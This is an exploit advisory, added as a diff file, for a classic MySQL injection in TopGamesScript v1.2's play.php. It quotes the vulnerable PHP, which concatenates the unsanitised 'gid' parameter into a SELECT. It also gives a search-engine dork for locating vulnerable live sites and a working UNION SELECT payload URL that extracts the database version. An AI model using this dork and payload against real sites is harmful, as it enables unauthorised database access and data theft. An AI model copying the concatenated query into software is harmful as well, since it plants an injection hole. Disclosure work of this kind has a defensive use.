@@ -1,0 +1,47 @@
+TopGamesScript-v1.2 (play.php) Sql Injection Vulnerability
+====================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         :
+http://sourceforge.net/projects/gamesscript/files/latest/download?source=directory
+.:. Dork           : inurl:"play.php?gid=" "Powered By TopGames.ws"
+####################################################################
+
+######################################
+VULNERABILITY: CLASSIC MYSQL INJECTION
+######################################
+
+/play.php (LINE: 4-19)
+
+-----------------------------------------------------------------------------
+ $gameID= $_GET['gid'];
+
+$con = mysql_connect($dbserver,$dbuser,$dbpassword);
+if (!$con)
+  {
+  die('Could not connect: ' . mysql_error());
+  }
+
+mysql_select_db($dbname, $con);
+
+$sqlselect="SELECT * FROM games WHERE gameid=" . $gameID;
+$result = mysql_query($sqlselect);
+
+$row = mysql_fetch_array($result);
+$gwidth =  $row['width'];
+$gheight = $row['height'];
+
+-----------------------------------------------------------------------------
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://localhost/TopGamesScript/play.php?gid=null and 1=2 UNION SELECT
+1,2,3,4,5,6,7,version(),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+
+
+####################################################################
